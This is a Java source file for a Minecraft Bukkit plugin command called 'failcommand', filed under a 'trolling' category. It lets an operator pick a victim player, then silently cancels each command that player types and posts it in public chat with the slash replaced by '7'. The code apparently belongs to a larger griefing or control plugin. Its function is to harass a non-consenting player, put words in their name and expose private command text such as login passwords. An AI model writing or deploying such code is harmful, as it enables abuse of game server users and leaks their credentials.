package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

import java.util.ArrayList;

public class Command_FAILCOMMAND extends CommandBase implements Listener {

    public ArrayList<Player> players = new ArrayList<>();

    public Command_FAILCOMMAND() {
        super("failcommand", "<Spieler>", Category.TROLLING);
        Bukkit.getPluginManager().registerEvents(this, Start.INSTANCE);
    }

    public void execute(String[] args, Player p) {
        if (args.length == 2) {
            try {
                Player vic = Bukkit.getPlayer(args[1]);
                if (!this.players.contains(vic)) {
                    this.players.add(vic);
                    p.sendMessage(Start.INSTANCE.chatPrefix + "Dieser Spieler wird jetzt beim Befehl eingeben failen :D");
                } else {
                    this.players.remove(vic);
                    p.sendMessage(Start.INSTANCE.chatPrefix + "Du hast den Prozess beendet!");
                }
            } catch (Exception ignored) {
            }
        }
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e) {
        if (this.players.contains(e.getPlayer())) {
            e.setCancelled(true);
            String FailedCommand = "7";

            for (int i = 1; i < e.getMessage().toCharArray().length; ++i) {
                FailedCommand = FailedCommand + e.getMessage().toCharArray()[i];
            }

            e.getPlayer().chat(FailedCommand);
        }
    }

}
